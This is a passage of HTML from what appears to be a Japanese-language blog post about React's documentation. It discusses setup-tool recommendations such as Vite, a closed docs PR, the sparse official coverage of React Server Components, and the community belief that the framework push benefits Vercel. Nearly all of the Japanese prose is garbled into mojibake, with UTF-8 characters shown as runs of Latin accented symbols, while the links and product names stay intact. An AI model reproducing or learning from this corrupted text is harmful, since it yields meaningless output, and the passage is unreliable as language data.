ã§ã‚ã‚‹ã“ã¨ï¼‰ã¨ã©ã®ã‚ˆã†ã«ä¸€è‡´ã™ã‚‹ã‹ã€ãã—ã¦å½¼ã‚‰ãŒè¨­è¨ˆé€šã‚Šã«çµ±åˆãŒæ©Ÿèƒ½ã—ã€è¨­è¨ˆã®ã‚¤ãƒ†ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã«é©å¿œã§ãã‚‹ã‚ˆã†ã«ã™ã‚‹ãŸã‚ã«ã€è¨€åŠã•ã‚ŒãŸãƒ„ãƒ¼ãƒ«ã¨ã©ã‚Œã ã‘ã®å½±éŸ¿åŠ›ï¼ã¤ãªãŒã‚Šã‚’æŒã£ã¦ã„ã‚‹ã‹ã€ã¨ã„ã†ç‚¹ã«ã‚ã‚‹ã‚ˆã†ã«æ„Ÿã˜ã¾ã™ã€‚...</p><p>ã“ã‚ŒãŒReactãƒãƒ¼ãƒ ãŒè€ƒãˆã¦ã„ã‚‹ã“ã¨ã¨é•ã†ã®ã§ã‚ã‚Œã°è¬ç½ªã—ã¾ã™ãŒã€ã“ã‚Œã¯ç§ã®æ­£ç›´ãªæ¨æ¸¬ã§ã™ã€‚ãªãœãªã‚‰ã€ViteãŒæ¨å¥¨ãƒ„ãƒ¼ãƒ«ã¨ã—ã¦ã‚ˆã‚Šè‰¯ãèªè­˜ã•ã‚Œã‚‹ã¾ã§ã«ã“ã‚Œã»ã©æ™‚é–“ãŒã‹ã‹ã£ãŸã“ã¨ã«ã€ç§ã‚‚å¤šãã®Reactãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨åŒã˜ãã‚‰ã„æˆ¸æƒ‘ã£ã¦ã„ã‚‹ã‹ã‚‰ã§ã™ã€‚</p></div></div>
<p>ç§ã¯æœ€çµ‚çš„ã«ã€ãƒˆãƒ¼ãƒ³ã‚’æ”¹å–„ã—ã€ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã‚»ãƒƒãƒˆã‚¢ãƒƒãƒ—ãƒ„ãƒ¼ãƒ«ã®æ¨å¥¨ã«ãƒ‹ãƒ¥ã‚¢ãƒ³ã‚¹ã‚’åŠ ãˆã€ã‚¢ãƒ—ãƒ­ãƒ¼ãƒã‚’é¸æŠã™ã‚‹éš›ã®ã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£çš„ãªã‚¬ã‚¤ãƒ€ãƒ³ã‚¹ã‚’æä¾›ã™ã‚‹ãŸã‚ã«ã€<a href="https://github.com/reactjs/react.dev/pull/7618">ã‚»ãƒƒãƒˆã‚¢ãƒƒãƒ—ãƒšãƒ¼ã‚¸ã‚’åˆ·æ–°ã™ã‚‹ãƒ‰ãƒ©ãƒ•ãƒˆPRã‚’æå‡º</a>ã—ã¾ã—ãŸã€‚ãã®PRã¯ã‚¯ãƒ­ãƒ¼ã‚ºã•ã‚Œã¾ã—ãŸãŒã€Reactãƒãƒ¼ãƒ ã¯ã„ãã¤ã‹ã®ã‚¢ã‚¤ãƒ‡ã‚¢ã¨è¨€ã„å›ã—ã‚’æ–°ã—ã„PRã«ãƒã‚§ãƒªãƒ¼ãƒ”ãƒƒã‚¯ã—ã¾ã—ãŸã€‚</p>
<p>æœ€çµ‚çš„ã«ã€å½¼ã‚‰ã¯ã‹ãªã‚Šåˆç†çš„ãª<a href="https://web.archive.org/web/20250526084038/https://react.dev/learn/build-a-react-app-from-scratch">ã€ŒReactã‚¢ãƒ—ãƒªã‚’ã‚¼ãƒ­ã‹ã‚‰æ§‹ç¯‰ã™ã‚‹ã€ã‚»ãƒƒãƒˆã‚¢ãƒƒãƒ—ãƒšãƒ¼ã‚¸</a>ã«è½ã¡ç€ãã¾ã—ãŸã€‚ãã‚Œã¯SPAã¨ç‹¬è‡ªã®ãƒ„ãƒ¼ãƒ«ã‚’é¸ã¶ã“ã¨ã‚’æœ‰åŠ¹ãªã‚¢ãƒ—ãƒ­ãƒ¼ãƒã¨ã—ã¦èªè­˜ã—ã€Vite / Parcel / RSPackã‚’æ¨å¥¨ãƒ“ãƒ«ãƒ‰ãƒ„ãƒ¼ãƒ«ã¨ã—ã¦ãƒªã‚¹ãƒˆã‚¢ãƒƒãƒ—ã—ã€ã„ãã¤ã‹ã®ãƒ«ãƒ¼ã‚¿ãƒ¼ã¨ãƒ‡ãƒ¼ã‚¿ãƒ•ã‚§ãƒƒãƒãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’æŒ‡ã—ç¤ºã—ã€ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã‚’è¨­å®šã—ã‚ˆã†ã¨ã—ã¦ã„ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«å®Ÿéš›ã«å½¹ç«‹ã¤ã‚¬ã‚¤ãƒ€ãƒ³ã‚¹ã‚’æä¾›ã—ã¦ã„ã¾ã™ã€‚</p>
<p>ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆãŒãã®ç‚¹ã«é”ã™ã‚‹ã¾ã§ã«æ•°å¹´ã‹ã‹ã£ãŸã®ã¯æ®‹å¿µã§ã™:( æ–°ã—ã„ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆãŒãƒªãƒªãƒ¼ã‚¹ã•ã‚ŒãŸç›´å¾Œã«ã€Reactãƒãƒ¼ãƒ ãŒã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ã‹ã‚‰æ¨å¥¨ã•ã‚ŒãŸè¡¨ç¾ã®å¤‰æ›´ã®ã„ãã¤ã‹ã‚’é©ç”¨ã—ã¦ã„ã‚Œã°ã€æ··ä¹±ã¨è‹¦æ‚©ã®å¤šãã¯é¿ã‘ã‚‰ã‚ŒãŸã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚</p>
<h2>æ‡¸å¿µï¼šã‚µãƒ¼ãƒãƒ¼ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã®ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã¨èª¬æ˜</h2>
<p>React Server Componentsã«é–¢ã™ã‚‹å¤§ããªå•é¡Œç‚¹ã¨æ··ä¹±ã®åŸå› ã®1ã¤ã¯ã€å…¬å¼ã®ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã¨æƒ…å ±ãŒæ•£åœ¨ã—ã¦ãŠã‚Šã€æ®‹å¿µãªãŒã‚‰ä¸è¶³ã—ã¦ã„ã‚‹ã“ã¨ã§ã™ã€‚</p>
<p>Reactãƒãƒ¼ãƒ ã¯<a href="https://react.dev/blog/2020/12/21/data-fetching-with-react-server-components">2020å¹´12æœˆã«èª¬æ˜ãƒ“ãƒ‡ã‚ªä»˜ãã§RSCã‚’ç™ºè¡¨</a>ã—ã€ãã‚Œã«ç¶šã„ã¦<a href="https://github.com/reactjs/rfcs/blob/main/text/0188-server-components.md">RSCã‚’èª¬æ˜ã™ã‚‹è©³ç´°ãªRFCãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆ</a>ãŒå…¬é–‹ã—ã¾ã—ãŸã€‚ã“ã‚Œã‚‰ã¯èƒŒæ™¯ã¨ä¸»ãªå‹•æ©Ÿã‚’èª¬æ˜ã™ã‚‹ä¸Šã§ã€ã¾ãšã¾ãšã®å†…å®¹ã§ã—ãŸã€‚</p>
<p>ã—ã‹ã—ã€RSCã®é–‹ç™ºãƒ—ãƒ­ã‚»ã‚¹ã¨ã€è¨­è¨ˆä¸Šã®é¸æŠã‚’å®Ÿè£…ã™ã‚‹ã®ã¯ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯æ¬¡ç¬¬ã§ã‚ã‚‹ã¨ã„ã†äº‹å®ŸãŒç›¸ã¾ã£ã¦ã€å®Ÿéš›ã®Reactãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã¯RSCã‚’æœ‰æ„ç¾©ã«æ–‡æ›¸åŒ–ã™ã‚‹ã“ã¨ã¯ã‚ã‚Šã¾ã›ã‚“ã§ã—ãŸã€‚</p>
<p>æ–°ã—ã„App Routerã®å½¢ã§RSCã®æœ€åˆã®å…¬å¼ãƒ™ãƒ¼ã‚¿ç‰ˆãŒ<a href="https://nextjs.org/blog/next-13">Next 13.0</a>ã§å…¬é–‹ã•ã‚Œã‚‹ã¾ã§ã«ã»ã¼2å¹´ã‹ã‹ã‚Šã€ã•ã‚‰ã«6ãƒ¶æœˆå¾Œã€2023å¹´5æœˆã«<a href="https://nextjs.org/blog/next-13-4">Next 13.4ãŒå…¬å¼ã«App Routerã‚’ã€Œå®‰å®šç‰ˆã€ã§ã‚ã‚Šæœ¬ç•ªç’°å¢ƒå¯¾å¿œ</a>ã§ã‚ã‚‹ã¨å®£è¨€ã—ã¾ã—ãŸã€‚Vercelã¨Nextã«ã¯å°è¦æ¨¡ãªãŒã‚‰éå¸¸ã«æ´»ç™ºãªdevrelãƒãƒ¼ãƒ ãŒã‚ã‚Šã€<a href="https://web.archive.org/web/20230502235021/https://beta.nextjs.org/docs">Next 13.4ã®ãƒªãƒªãƒ¼ã‚¹ã®é ƒã«ã¯ã€å½“æ™‚æ–°ã—ã‹ã£ãŸApp Routerã‚’ã‚«ãƒãƒ¼ã™ã‚‹ãŸã‚ã«Nextã®ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚’å¤§å¹…ã«æ›¸ãç›´ã—ã¦ã„ã¾ã—ãŸ</a>ï¼ˆã€Œãƒ™ãƒ¼ã‚¿ç‰ˆã€ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã¨ã—ã¦åˆ©ç”¨å¯èƒ½ï¼‰ã€‚ãã‚Œã«ã¯ã€RSCã®ä½¿ç”¨ã«ã¤ã„ã¦èªã‚‹ã„ãã¤ã‹ã®ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆãƒšãƒ¼ã‚¸ãŒã€ã€Œãƒ‡ãƒ¼ã‚¿ãƒ•ã‚§ãƒƒãƒã€ã‚«ãƒ†ã‚´ãƒªã®ä¸‹ã«å«ã¾ã‚Œã¦ã„ã¾ã—ãŸã€‚ã¾ãŸã€å¾Œã«ã¯<a href="https://vercel.com/blog/understanding-react-server-components">ã€ŒReact Server Componentsã‚’ç†è§£ã™ã‚‹ã€</a>ã®ã‚ˆã†ãªè©³ç´°ãªãƒ–ãƒ­ã‚°æŠ•ç¨¿ã‚‚ã‚ã‚Šã¾ã—ãŸã€‚ã“ã‚Œã‚‰ã¯ã€ã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£ã¨ã‚³ãƒ³ã‚»ãƒ—ãƒˆã®éå¸¸ã«å½¹ç«‹ã¤èª¬æ˜ã‚’å«ã‚€ã€å„ªã‚ŒãŸãƒªã‚½ãƒ¼ã‚¹ã§ã—ãŸã€‚</p>
<p>ãã‚Œã«ã‚‚ã‹ã‹ã‚ã‚‰ãšã€RSCã®æ©Ÿèƒ½ã¯Reactè‡ªä½“ã®ä¸€éƒ¨ã§ã‚ã£ãŸã«ã‚‚ã‹ã‹ã‚ã‚‰ãšã€Reactã®ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã«ã¯RSCã«é–¢ã™ã‚‹æƒ…å ±ãŒä¸€åˆ‡ã‚ã‚Šã¾ã›ã‚“ã§ã—ãŸã€‚ã€ŒRSCã¨ã¯ä½•ã‹ã€ã‚‚ãªãã€ã€ŒRSCã‚’ã©ã†ä½¿ã†ã‹ã€ã‚‚ãªãã€ãã—ã¦é–“é•ã„ãªãã€Œè‡ªåˆ†ã®ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’RSCã¨çµ±åˆã™ã‚‹ã«ã¯ã©ã†ã™ã‚Œã°ã‚ˆã„ã‹ã€ã‚‚ã‚ã‚Šã¾ã›ã‚“ã§ã—ãŸã€‚Vercelã®ãƒãƒ¼ãƒ ã¯å®Ÿéš›ã®è£½å“ã¨Reactã¨ã®é‡è¤‡éƒ¨åˆ†ã‚’æ–‡æ›¸åŒ–ã™ã‚‹è‰¯ã„ä»•äº‹ã‚’ã—ã¾ã—ãŸãŒã€å®Ÿéš›ã®Reactãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆè‡ªä½“ã«RSCã«é–¢ã™ã‚‹æƒ…å ±ã‚„èª¬æ˜ãŒãªã„ã“ã¨ã¯äººã€…ã«ã¨ã£ã¦éå¸¸ã«æ··ä¹±ã‚’æ‹›ãã¾ã—ãŸï¼ˆæ™‚ç³»åˆ—çš„ã«ã¯ã€ãã‚Œã¯æ•°ãƒ¶æœˆå‰ã«å…¬å¼ã«ãƒ­ãƒ¼ãƒ³ãƒã•ã‚ŒãŸã°ã‹ã‚Šã§ã—ãŸï¼‰ã€‚</p>
<p>ã‚½ãƒ¼ã‚·ãƒ£ãƒ«ãƒ¡ãƒ‡ã‚£ã‚¢ä¸Šã§ã¯ã€å€‹ã€…ã®Reactãƒãƒ¼ãƒ ãƒ¡ãƒ³ãƒãƒ¼ã«ã‚ˆã‚‹å¤šãã®è­°è«–ãŒã‚ã‚Šã€è³ªå•ã«ç­”ãˆãŸã‚Šã€æ¦‚å¿µã¨ã—ã¦ã®RSCã‚’æ“è­·ã—ãŸã‚Šã€RSCã®ã‚»ãƒ¼ãƒ«ã‚¹ãƒã‚¤ãƒ³ãƒˆã‚’å…·ä½“åŒ–ã—ã‚ˆã†ã¨ã—ãŸã‚Šã—ã¦ãã¾ã—ãŸã€‚ã—ã‹ã—ã€ç¾åœ¨ã€RSCã«é–¢ã™ã‚‹å”¯ä¸€ã®å…¬å¼ã‚³ã‚¢ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆãƒšãƒ¼ã‚¸ã¯<a href="https://react.dev/reference/rsc/server-components">APIãƒªãƒ•ã‚¡ãƒ¬ãƒ³ã‚¹ï¼šã‚µãƒ¼ãƒãƒ¼ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆ</a>ã§ã™ã€‚ã—ã‹ã—ã“ã®ãƒšãƒ¼ã‚¸ã¯æ­£ç›´ãªã¨ã“ã‚æ··ä¹±ã‚’æ‹›ãã ã‘ã§ç‰¹ã«å½¹ç«‹ã¤ã‚ˆã†ã«ã¯æ€ãˆã¾ã›ã‚“ã€‚ãã‚Œã¯å†…å®¹çš„ã«é–“é•ã„ãªãã€ŒAPIãƒªãƒ•ã‚¡ãƒ¬ãƒ³ã‚¹ã€ã§ã¯ãªãã€ãã®å†…å®¹ã«ã¯RSCã‚’ç´¹ä»‹ã—ãŸã‚Šã€ã„ã¤ã€ã©ã®ã‚ˆã†ã«ä½¿ç”¨ã™ã‚‹ã‹ã‚’èª¬æ˜ã—ãŸã‚Šã™ã‚‹å®Ÿéš›ã®æ–‡è„ˆãŒã‚ã‚Šã¾ã›ã‚“ - ãã‚Œã¯ãƒ©ãƒ³ãƒ€ãƒ ãªãƒˆãƒ”ãƒƒã‚¯ã®ã”ã¡ã‚ƒã¾ãœã§ã™ã€‚</p>
<p>RSCã®ã•ã¾ã–ã¾ãªå´é¢ã‚’èª¬æ˜ã™ã‚‹å„ªã‚ŒãŸå¤–éƒ¨ãƒ–ãƒ­ã‚°æŠ•ç¨¿ãŒã„ãã¤ã‹ã‚ã‚Šã¾ã—ãŸï¼š</p>
<ul>
<li>Dan Abramovã¯<a href="https://overreacted.io/">RSCã®ãƒ¡ãƒ³ã‚¿ãƒ«ãƒ¢ãƒ‡ãƒ«ã¨ãã‚Œã‚‰ãŒè§£æ±ºã™ã‚‹å•é¡Œã‚’èª¬æ˜ã™ã‚‹æ•°å¤šãã®ç´ æ™´ã‚‰ã—ã„æŠ•ç¨¿</a>ã‚’æ›¸ã„ã¦ã„ã¾ã™ã€‚</li>
<li>Vercelã¯ç´ æ™´ã‚‰ã—ã„<a href="https://vercel.com/blog/understanding-react-server-components">ã€ŒReact Server Componentsã‚’ç†è§£ã™ã‚‹ã€</a>ç´¹ä»‹ãƒ–ãƒ­ã‚°æŠ•ç¨¿ã‚’å…¬é–‹ã—ã¾ã—ãŸã€‚</li>
<li>Daniel Saewitzã¯<a href="https://saewitz.com/server-components-give-you-optionality">ã€Œã‚µãƒ¼ãƒãƒ¼ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã¯é¸æŠè‚¢ã‚’ä¸ãˆã‚‹ã€</a>ã‚’æ›¸ãã€ãã‚Œã‚‰ãŒãƒ„ãƒ¼ãƒ«ãƒœãƒƒã‚¯ã‚¹ã¸ã®è¿½åŠ ã§ã‚ã‚‹ã“ã¨ã‚’èª¬æ˜ã—ã¾ã—ãŸã€‚</li>
</ul>
<p>ã“ã‚Œã“ããŒã€Reactã®ã‚³ã‚¢ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã«ã‚ã‚‹ã¹ãæƒ…å ±ã§ã™ - RSCã®ã‚³ãƒ³ã‚»ãƒ—ãƒˆã¨ã€ãªãœãã‚Œã‚‰ã‚’ä½¿ã„ãŸã„ã‹ã®èª¬æ˜ã§ã‚ã‚Šã€ç‰¹å®šã®ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ãŒRSCã‚’ã©ã®ã‚ˆã†ã«å®Ÿè£…ã—ãŸã‹ã¨ã¯ç„¡é–¢ä¿‚ã§ã™ã€‚</p>
<p>ã“ã‚Œã«é–¢é€£ã—ã¦ã€ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ã¯ã€ŒRSCã¯Reactã®æœªæ¥ã§ã‚ã‚‹ã€ã€ã€ŒReactãƒãƒ¼ãƒ ã¯ç§ãŸã¡ã«RSCã‚’å¸¸ã«ã©ã“ã§ã‚‚ä½¿ã£ã¦ã»ã—ã„ã¨æ€ã£ã¦ã„ã‚‹ã€ã¨ã„ã†è€ƒãˆã‚’æŒã¡å¸°ã£ã¦ã—ã¾ã„ã¾ã—ãŸã€‚å®Ÿéš›ã«ã¯ã€Reactãƒãƒ¼ãƒ ã®ãƒ¡ãƒ³ãƒãƒ¼ãŒã‚½ãƒ¼ã‚·ãƒ£ãƒ«ãƒ¡ãƒ‡ã‚£ã‚¢ã§ã€ŒRSCã¯ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã§ã‚ã‚Šã€ç§ãŸã¡ã¯ãŸã äººã€…ã«ãã‚Œã‚’æ­£ã—ãç†è§£ã—ã¦ã»ã—ã„ã ã‘ã ã€ã¨æ˜è¨€ã—ã¦ã„ã‚‹ã®ã‚’è¦‹ã¦ãã¾ã—ãŸã€‚ãã®æ··ä¹±ã‚’è€ƒãˆã‚‹ã¨ã€ãã®ç‚¹ã‚’ç‰¹ã«ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã§æŒ‡æ‘˜ã™ã‚‹ã“ã¨ãŒé‡è¦ã ã¨æ€ã‚ã‚Œã¾ã™ã€‚</p>
<p>å€‹äººçš„ã«ã¯ã€Reactã®ã‚³ã‚¢ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã«RSCã«é–¢ã™ã‚‹ã‚»ã‚¯ã‚·ãƒ§ãƒ³å…¨ä½“ãŒè¿½åŠ ã•ã‚Œã‚‹ã®ã‚’è¦‹ãŸã„ã§ã™ã€‚ä¾‹ãˆã°ã€ä»¥ä¸‹ã®ã‚ˆã†ãªãƒšãƒ¼ã‚¸ã§ã™ï¼š</p>
<ul>
<li>ã€ŒRSCå…¥é–€ã€</li>
<li>ãƒ¡ãƒ³ã‚¿ãƒ«ãƒ¢ãƒ‡ãƒ«</li>
<li>ãƒ¦ãƒ¼ã‚¹ã‚±ãƒ¼ã‚¹ / RSCã‚’é¸æŠã™ã‚‹ã‚¿ã‚¤ãƒŸãƒ³ã‚°</li>
<li>æŠ€è¡“çš„ãªãƒ‡ãƒ¼ã‚¿ãƒ•ãƒ­ãƒ¼ / ã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£</li>
<li>æ¡ç”¨ / ç§»è¡Œ</li>
<li>FAQ</li>
<li>ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯å®Ÿè£…è€…ã‚¬ã‚¤ãƒ‰</li>
</ul>
<p>ã“ã‚Œã‚‰ã®ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆãƒšãƒ¼ã‚¸ãŒã‚ã£ã¦ã‚‚ã€å…¨ã¦ã®ç–‘å•ãŒãªããªã‚‹ã‚ã‘ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ãã‚‚ãã‚‚ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚’èª­ã¾ãªã„äººã‚‚ãŸãã•ã‚“ã„ã¾ã™:) ã—ã‹ã—ã€ã“ã‚Œã‚‰ã®ãƒˆãƒ”ãƒƒã‚¯ãŒå…¬å¼ã«ã‚«ãƒãƒ¼ã•ã‚Œã‚‹ã“ã¨ã§å¯è¦–åŒ–ã•ã‚Œã€ã‚½ãƒ¼ã‚·ãƒ£ãƒ«ãƒ¡ãƒ‡ã‚£ã‚¢ã§ã“ã‚Œã‚‰ã®è³ªå•ãŒæŒã¡ä¸ŠãŒã‚‹ãŸã³ã«ç­”ãˆã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã‚‹ãƒªã‚½ãƒ¼ã‚¹ã¨ã—ã¦æ©Ÿèƒ½ã™ã‚‹ã§ã—ã‚‡ã†ã€‚</p>
<h2>æ‡¸å¿µã‹ã‚‰ã®æ•™è¨“</h2>
<p>ç§ã¯ã€Reactãƒãƒ¼ãƒ ãŒã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆä¸Šã®FUDã‚’æ‰•æ‹­ã™ã‚‹ãŸã‚ã«å½¼ã‚‰ã®æ™‚é–“ã®å…¨ã¦ã‚’è²»ã‚„ã™ã®ãŒå½¼ã‚‰ã®ä»•äº‹ã ã¨ã¯æ€ã„ã¾ã›ã‚“ã€‚å¤šãã®äººãŒæ„è¦‹ã‚’æŒã¤ã§ã—ã‚‡ã†ã—ã€ãã®å¤šãã¯ç•°ãªã‚‹ã‹é–“é•ã£ã¦ã„ã‚‹ã§ã—ã‚‡ã†ã€‚</p>
<p>ã¨ã¯ã„ãˆã€ã€Œãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã¨ã‚µãƒ¼ãƒãƒ¼ã¸ã®ã“ã®å…¨ã¦ã®å¼·èª¿ã¯ã€Vercelã«ãŠé‡‘ã‚’ç¨¼ãŒã›ã‚‹ãŸã‚ã«ç§ãŸã¡ã«å¼·åˆ¶ã•ã‚Œã¦ã„ã‚‹ã€ã¨ã„ã†ä¸€è²«ã—ãŸå¼·ã„ãƒ†ãƒ¼ãƒãŒã‚ã‚‹ã“ã¨ã¯é©šãã¹ãã“ã¨ã§ã™ã€‚ãã‚Œã¯é–“é•ã£ã¦ã„ã¾ã™ãŒã€äººã€…ã‚’ãã®ä¿¡å¿µã«å°ãã®ã«ååˆ†ãªçŠ¶æ³è¨¼æ‹ ãŒã‚ã‚Šã€Reactãƒãƒ¼ãƒ ã®è¡Œå‹•ã¨å£°æ˜ã¯ã‚ã‚‹ç¨‹åº¦ã€ãã‚Œã‚’åè¨¼ã™ã‚‹ã®ã§ã¯ãªãã€ãã®ä¿¡å¿µã‚’å¼·åŒ–ã—ã¦ã—ã¾ã„ã¾ã—ãŸã€‚æ®‹å¿µãªãŒã‚‰ã€ç¾æ™‚ç‚¹ã§ã¯ãã‚Œã¯ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ã«æ°¸ä¹…ã«åŸ‹ã‚è¾¼ã¾ã‚ŒãŸãƒŸãƒ¼ãƒ ã®ã‚ˆã†ã«ãªã£ã¦ãŠã‚Šã€ç§ãŸã¡ã¯ãã‚Œã‚’ãªãã™ã“ã¨ã¯ã§ããªã„ã¨æ€ã„ã¾ã™ã€‚</p>
<p>ã¾ãŸã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒReactãŒå°†æ¥ã©ã®ã‚ˆã†ã«å¤‰åŒ–ã—ãŸã‚Šå‹•ä½œã—ãªããªã£ãŸã‚Šã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹ã‹ã«ã¤ã„ã¦å¿ƒé…ã—ãŸã‚Šã€æƒ³å®šã—ãŸã‚Šã—ã¦ã„ã‚‹ã“ã¨ã‚‚ã€æœ¬å½“ã«æ‡¸å¿µã™ã¹ãã“ã¨ã§ã™ã€‚ç‰¹ã«ã€ãã‚Œã‚‰ã®æ‡¸å¿µãŒæ˜ã‚‰ã‹ã«é–“é•ã£ã¦ãŠã‚Šã€ç°¡å˜ã«åè¨¼å¯èƒ½ã§ã‚ã‚‹å ´åˆã¯ãªãŠã•ã‚‰ã§ã™ã€‚ã‚ãªãŸã¯ã“ã‚Œã¾ã§é€šã‚Šã«Reactã‚’ä½¿ã„ç¶šã‘ã‚‹ã“ã¨ãŒã§ãã€RSC / ã‚µãƒ¼ãƒãƒ¼ã®æ©Ÿèƒ½ã¯å…¨ã¦ã€å®Œå…¨ã«ä»˜åŠ çš„ã§ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã§ã™ã€‚</p>
<p>ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆãŒãã†ã„ã†ã‚‚ã®ã§ã‚ã‚‹ä»¥ä¸Šã€å®Ÿéš›ã®Reactãƒ–ãƒ­ã‚°ã«ãã‚Œã‚‰ã®å£°æ˜ã‚’æ˜ç¢ºã«åè«–ã™ã‚‹ãƒ–ãƒ­ã‚°æŠ•ç¨¿ãŒã‚ã£ãŸã¨ã—ã¦ã‚‚ã€å¤šãã®äººã€…ã®å¿ƒã‚’å¤‰ãˆã‚‹ã“ã¨ã¯ãªã„ã§ã—ã‚‡ã†ã€‚ã—ã‹ã—ã€Reactçµ„ç¹”ã‹ã‚‰ã®ã‚ˆã‚Šè‰¯ã„ãƒ‡ãƒ™ãƒ­ãƒƒãƒ‘ãƒ¼ãƒªãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã‚ºæ´»å‹• - æ‡¸å¿µã‚’èª­ã¿ã€ãã‚Œã‚‰ãŒå­˜åœ¨ã™ã‚‹ã“ã¨ã‚’èªã‚ã€ã©ã“ã‹ã‚‰æ¥ã¦ã„ã‚‹ã®ã‹ã‚’ç†è§£ã—ã€ãã‚Œã‚‰ã‚’æ˜ç¢ºã«ã—ã¦ç­”ãˆã‚ˆã†ã¨ã™ã‚‹ã“ã¨ã«ã‚‚ã£ã¨æ™‚é–“ã‚’è²»ã‚„ã™ã“ã¨ - ã§ã€ãã®æœ€æ‚ªã®äº‹æ…‹ã®ä¸€éƒ¨ã¯é¿ã‘ã‚‰ã‚ŒãŸã‹ã‚‚ã—ã‚Œãªã„ã¨æ„Ÿã˜ã¾ã™ã€‚</p>
<p>ã€Œãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã€ã¸ã®æ¨é€²ã¯æœ¬å½“ã«å–„æ„ã‹ã‚‰å‡ºãŸã‚‚ã®ã ã¨æ„Ÿã˜ã¾ã™ãŒã€åŒæ™‚ã«ã‚ã¾ã‚Šã«ã‚‚åºƒç¯„ã§ã€æœ€çµ‚çš„ã«ã¯ã‚¨ã‚³ã‚·ã‚¹ãƒ†ãƒ ã«ãŠã‘ã‚‹å¤šæ§˜ãªä½¿ç”¨ãƒ‘ã‚¿ãƒ¼ãƒ³ã‚’è»½è¦–ã—ã¦ã„ã‚‹ã¨ã‚‚æ€ã„ã¾ã™ã€‚ã¯ã„ã€ãƒ‹ãƒ¥ã‚¢ãƒ³ã‚¹ã‚’æä¾›ã™ã‚‹ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚’æ›¸ãã€æ¨å¥¨äº‹é …ã‚’æä¾›ã™ã‚‹ã®ã¯é›£ã—ã„ã§ã™ã—ã€åˆå¿ƒè€…ã‚’å¯¾è±¡ã¨ã—ã€ã‚¨ã‚³ã‚·ã‚¹ãƒ†ãƒ ã‚’ã‚ˆã‚Šè‰¯ã„æ–¹å‘ã«å°ããŸã‚ã«ç‰©äº‹ã‚’ã‚·ãƒ³ãƒ—ãƒ«ã«ä¿ã¨ã†ã¨ã™ã‚‹ã“ã¨ã¯ç†è§£ã§ãã¾ã™...ã—ã‹ã—ã€ãƒ¡ãƒ³ãƒ†ãƒŠãƒ¼ã§ã‚ã‚‹ã“ã¨ã®ä¸€éƒ¨ã¯ã€ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ã«ã‚ˆã£ã¦ã‚ãªãŸã®ãƒ„ãƒ¼ãƒ«ãŒä½¿ç”¨ã•ã‚Œã‚‹å¤šæ§˜ãªæ–¹æ³•ã‚’èªè­˜ã—ã€ã‚µãƒãƒ¼ãƒˆã™ã‚‹ã“ã¨ã§ã™ã€‚</p>
